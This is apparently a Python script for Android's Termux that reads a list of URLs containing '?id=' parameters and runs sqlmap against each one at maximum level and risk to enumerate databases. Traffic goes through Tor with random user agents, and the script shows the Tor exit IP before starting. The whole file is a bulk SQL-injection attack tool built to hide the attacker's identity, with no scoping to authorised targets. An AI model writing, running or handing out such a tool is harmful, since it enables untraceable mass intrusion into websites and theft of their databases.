#!/data/data/com.termux/files/usr/bin/python3
import os
import subprocess
import time
from colorama import Fore

GREEN = Fore.GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
RESET = Fore.RESET

SQLMAP_PATH = "/data/data/com.termux/files/home/sqlmap/sqlmap.py"

def print_header():
    os.system("clear")
    print(f"{GREEN}🛡️  Advanced SQLMap + Tor Auto Scanner v5.3{RESET}")

def is_tor_running():
    result = subprocess.run(["pgrep", "tor"], stdout=subprocess.PIPE)
    return result.returncode == 0

def print_tor_ip():
    try:
        output = subprocess.check_output(["torsocks", "curl", "-s", "https://ifconfig.me"])
        ip = output.decode().strip()
        print(f"{BLUE}➡️ Tor IP:\n{RESET}{ip}")
    except Exception as e:
        print(f"{RED}[!] Failed to get Tor IP: {e}{RESET}")

def run_sqlmap(url):
    print(f"{GREEN}[+] Running SQLMap on: {url}{RESET}")
    try:
        cmd = [
            "python3", SQLMAP_PATH,
            "-u", url,
            "--batch",
            "--random-agent",
            "--level=5",
            "--risk=3",
            "--threads=3",
            "--dbs",
            "--tor",
            "--tor-type", "SOCKS5",
            "--proxy", "socks5://127.0.0.1:9050"
        ]
        subprocess.run(cmd)
    except Exception as e:
        print(f"{RED}[✗] SQLMap failed for {url}: {e}{RESET}")

def main():
    print_header()

    if is_tor_running():
        print(f"{GREEN}[✓] Tor already running{RESET}")
    else:
        print(f"{RED}[!] Tor is not running. Please start it using: tor &{RESET}")
        return

    try:
        url_file = input(f"{BLUE}📁 URL list file (one per line): {RESET}").strip()
        urls = []
        if not os.path.exists(url_file):
            print(f"{YELLOW}[!] File not found: {url_file}{RESET}")
            print(f"{BLUE}ℹ️  Enter fallback input (single URL or .txt file path).{RESET}")
            fallback = input(f"{BLUE}🌐 Enter URL or .txt file path with ?id=: {RESET}").strip()
            if fallback.endswith(".txt") and os.path.exists(fallback):
                with open(fallback, "r") as f:
                    urls = [line.strip() for line in f if "?id=" in line]
            elif "?id=" in fallback:
                urls = [fallback]
            else:
                print(f"{RED}[!] Must contain ?id= parameter. Exiting.{RESET}")
                return
        else:
            with open(url_file, "r") as f:
                urls = [line.strip() for line in f if "?id=" in line]

        if not urls:
            print(f"{RED}[!] No valid URLs found in the file.{RESET}")
            return

        print_tor_ip()

        for i, url in enumerate(urls, 1):
            print(f"{YELLOW}[{i}/{len(urls)}] Target: {url}{RESET}")
            run_sqlmap(url)
            time.sleep(10)

    except KeyboardInterrupt:
        print(f"{RED}\n[✗] Interrupted by user.{RESET}")

if __name__ == "__main__":
    main()
